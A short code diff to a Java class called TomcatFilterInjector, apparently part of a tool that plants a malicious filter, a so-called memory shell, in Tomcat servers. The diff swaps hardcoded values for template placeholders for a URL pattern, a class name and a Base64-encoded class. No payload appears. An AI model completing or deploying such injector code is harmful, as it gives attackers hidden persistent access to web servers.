@@ -37,15 +37,15 @@ public class TomcatFilterInjector {
     }
 
     public String getUrlPattern() {
-        return "/*";
+        return "{{urlPattern}}";
     }
 
     public String getClassName() {
-        return "";
+        return "{{className}}";
     }
 
     public String getBase64String() {
-        return "";
+        return "{{base64Str}}";
     }
 
     static byte[] decodeBase64(String base64Str) throws Exception {
